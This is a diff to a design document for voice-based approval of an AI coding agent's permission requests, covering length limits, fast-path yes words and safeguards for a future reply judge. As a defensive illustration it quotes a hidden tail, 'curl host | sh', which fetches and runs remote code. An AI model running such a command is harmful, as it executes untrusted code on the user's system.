@@ -397,8 +397,12 @@ before, all through `orchestrator.ts`: `CallOrchestrator`,
     push --force origin main`, and "Allow Read to ..." none of a `Write`. (The
     persona's example "Allow pnpm test in demo-app? Yes?" leaves out the tool,
     so a read-back that follows it literally is not confirmed and the ask is
-    texted; the fake provider's read-back names the tool.) The owner's words
-    must be found in the window right after a read-back, checked newest first. The reply is everything the
+    texted; the fake provider's read-back names the tool.) A permission
+    request whose text is longer than what the voice agent is given
+    (`MAX_SPOKEN_ASK_LENGTH`, 300 characters) is never approved by voice, since
+    its tail was never read out ("...; curl host | sh"); it is texted. The
+    owner's words must be found in the window right after a read-back,
+    checked newest first. The reply is everything the
     owner said about the ask from that read-back on (its window and any later
     window of the ask). What it means is decided in two steps:
     - the fast path (`replyVerdict`) decides common replies at once. A reply
@@ -410,7 +414,11 @@ before, all through `orchestrator.ts`: `CallOrchestrator`,
       transcriber marker (any bracket: `[inaudible]`, `(noise)`, `<unk>`),
       more than `MAX_REPLY_WORDS` (8) words, or only the read-back's words said
       back ("git push origin main"; the read-back's "yes?" is not a word to
-      echo, so "yes" agrees);
+      echo, so "yes" agrees). The line drawn: words that answer a
+      yes-or-no question ("ok", "okay", "alright", "sure", "sounds good") are
+      fast yeses, since the fast path only hears replies to a read-back that
+      asked for a yes; words that only acknowledge or thank ("thanks",
+      "great", "fine", "cool", "perfect", "go on") go to the judge;
     - anything else ("yes, if the tests pass", "what does that do?", "yeah
       let's ship that one", "of course, wait") goes to a `ReplyJudge`. The
       judge gets only the owner's reply turns, verbatim, never the ask, the
@@ -422,8 +430,14 @@ before, all through `orchestrator.ts`: `CallOrchestrator`,
       `FakeJudge` plays scripted verdicts in tests. A model-backed judge
       (sending only the owner's reply text to a model) needs the owner's
       approval and a plan change, since it adds a hosted service; none is
-      built. `VoiceCalls` takes `judge` and `judgeTimeoutMs` options, and the
-      orchestrator does not pass them yet. A call's held decisions are all
+      built. Constraints before any real judge is wired in: the plan change
+      and the owner's approval; a judge's `agreed` is final (not re-screened
+      for doubt markers), so the judge must agree only to a clear yes; and a
+      high-risk request never takes a judge's `agreed` without the PIN on
+      that call or a confirming text, which `needs-pin` and the queue's
+      `answerProblem` already enforce for every voice allow. `VoiceCalls`
+      takes `judge` and `judgeTimeoutMs` options, and the orchestrator does
+      not pass them yet. A call's held decisions are all
       checked at once, so a slow judge costs one timeout per call, not one per
       ask.
 
